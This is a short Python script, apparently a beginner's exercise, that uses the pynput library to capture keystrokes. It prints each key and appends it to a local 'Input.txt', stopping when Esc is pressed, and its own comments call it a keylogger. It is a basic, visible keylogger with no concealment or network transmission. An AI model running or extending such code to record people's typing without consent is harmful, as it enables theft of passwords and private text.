#PYNPUT
#This library allows you to control and monitor input devices.
import pynput

from pynput.keyboard import Key, Listener

count = 0
key_list = []

#Saving inputs in Input.txt file
def write_file(key_list):
    with open("Input.txt", "a") as f:
        for key in key_list:
            sp = str(key).replace("'", "")
            #if space key pressed add new line
            if sp.find("space") > 0:
                f.write('\n')
            #skip command key like ENTER, SHIFT, BACKSPACE, etc
            elif sp.find("Key") == -1:
                f.write(sp)

def key_press(key):
    global key_list, count

    count += 1
    key_list.append(key)

    print("{0} pressed".format (key))

    if count > 0:
        count = 0
        write_file(key_list)
        key_list = []

def key_release(key):
    #Press esc to stop keylogger
    if key == Key.esc:
        return False

with Listener(on_press = key_press, on_release = key_release) as listner:
    listner.join()